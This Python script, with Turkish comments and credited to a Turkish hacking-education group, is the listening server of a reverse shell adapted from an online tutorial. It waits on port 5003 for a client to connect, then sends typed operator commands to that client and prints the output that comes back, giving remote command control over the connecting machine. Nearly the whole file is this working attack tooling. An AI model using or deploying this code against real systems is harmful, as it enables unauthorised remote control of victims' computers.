#!/usr/bin/env python
#! -*- coding: utf-8 -*-
# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

import socket

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 5003

# send 1024 (1kb) a time (as buffer size)
BUFFER_SIZE = 1024

# create a socket object
s = socket.socket()

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)
print(f"Bağlantılar Dinleniyor >> {SERVER_HOST}:{SERVER_PORT} ...")

# accept any connections attempted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Bağlandı!")

# just sending a message, for demonstration purposes
message = "Merabayın, @KekikAkademi'ye Hoş Geldiniz!".encode()
client_socket.send(message)

while True:
    # get the command from prompt
    command = input("Shell'e Yola >> ")
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    results = client_socket.recv(BUFFER_SIZE).decode()
    # print them
    print(results)
# close connection to the client
client_socket.close()
# close server connection
s.close()

#https://www.thepythoncode.com/article/create-reverse-shell-python